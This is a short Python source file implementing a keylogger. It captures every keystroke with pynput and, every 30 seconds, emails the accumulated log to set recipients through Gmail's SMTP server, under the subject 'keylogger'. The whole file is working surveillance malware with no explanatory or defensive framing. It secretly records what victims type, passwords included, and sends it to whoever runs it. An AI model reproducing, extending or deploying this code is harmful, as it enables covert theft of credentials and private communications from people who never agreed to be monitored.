#!/usr/bin/env python3

import pynput.keyboard
import threading
import smtplib

from email.mime.text import MIMEText

class Keyboard:

    def __init__(self, sender, password, recipients):
        self.log = ""
        self.request_shutdown = False
        self.is_first_run = True
        self.timer = None

        self.sender = sender
        self.recipients = recipients
        self.__password = password

    def process_key(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            self.log += " " if "space" in str(key) else f" {str(key).split('.')[1].upper()} "

    def send_email(self, subject, body, sender, recipients, password):
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())

    def clear_log(self):
        self.log = "\n[+] Keylogger initialized\n" if self.is_first_run else self.log
        self.send_email("keylogger", self.log, self.sender, self.recipients, self.password)
        self.log = ""
        self.is_first_run = False

        if not self.request_shutdown:
            self.timer = threading.Timer(30, self.clear_log)
            self.timer.start()

    def shutdown(self):
        self.request_shutdown = True
        self.timer.cancel()

    def start(self):
        keylogger = pynput.keyboard.Listener(on_press=self.process_key)
        
        with keylogger:
            self.clear_log()
            keylogger.join()

    @property
    def password(self):
        return self.__password
